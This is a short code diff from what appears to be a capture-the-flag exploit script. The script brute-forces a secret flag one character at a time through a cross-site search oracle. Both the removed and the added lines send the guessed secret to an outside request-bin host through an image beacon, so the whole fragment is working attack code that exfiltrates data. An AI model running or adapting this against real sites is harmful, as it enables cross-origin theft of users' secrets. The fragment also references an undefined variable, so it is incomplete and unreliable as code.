@@ -34,13 +34,19 @@
 
                     for (let c of chars) {
                         if (await search(secret + c)) {
-                            secret += c;
-                            new Image().src = `https://wrisagx.request.dreamhack.games?secret=${secret}`;
-                            console.log(`found: ${secret}`);
-                            found = true;
+                            // secret += c;
+                            // new Image().src = `https://wrisagx.request.dreamhack.games?secret=${secret}`;
+                            // console.log(`found: ${secret}`);
+                            // found = true;
 
-                            if (c === '}') return;
-                            break;
+                            // if (c === '}') return;
+                            // break;
+                            new Image().src = `https://wrisagx.request.dreamhack.games?try=${secret + c}&result=${isFound}`;
+        
+                            if (isFound) {
+                                secret += c;
+                                break;
+                            }
                         }
                     }
 
